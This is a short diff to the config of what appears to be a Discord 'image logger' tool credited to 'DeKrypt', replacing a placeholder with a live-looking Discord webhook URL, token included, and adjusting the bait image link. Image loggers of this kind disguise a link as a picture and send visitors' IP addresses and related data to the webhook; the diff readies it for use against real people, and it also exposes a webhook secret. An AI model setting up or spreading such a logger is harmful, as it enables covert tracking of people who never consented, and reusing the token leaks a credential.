@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://media1.tenor.com/images/8488ee981be1f3f7821a32485d63c0c9/tenor.gif?itemid=16187521", # You can also have a custom image by using a URL argument
+    "webhook": "https://ptb.discord.com/api/webhooks/1340443135914020904/2-iQV51rh67tjr6lTvZ6M-IaEeTrSm3aHk3emyVBKk6exYMG5O2-yd3A3zW5lxd7SBHp",
+    "image": "https://media1.tenor.com/images/8488ee981be1f3f7821a32485d63c0c9/tenor.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
